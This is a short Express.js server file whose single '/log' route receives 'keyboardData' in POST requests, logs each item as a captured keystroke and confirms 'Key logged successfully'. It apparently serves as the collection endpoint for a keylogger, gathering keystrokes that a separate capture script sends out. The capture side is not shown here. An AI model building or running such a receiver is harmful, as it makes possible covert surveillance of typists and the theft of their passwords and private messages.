const express = require("express");
const bodyParser = require("body-parser");
const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Route to handle the incoming POST request
app.post("/log", (req, res) => {
    const keyboardData = req.body.keyboardData;  // Correct the field name

    // Check if there's data received
    if (keyboardData) {
        console.log(`Key captured: ${keyboardData}`);  // Log the captured keystroke data
    } else {
        console.log("No key data received.");
    }

    // Send back a response to acknowledge successful logging
    res.send({ message: "Key logged successfully", keyboardData });
});

app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});
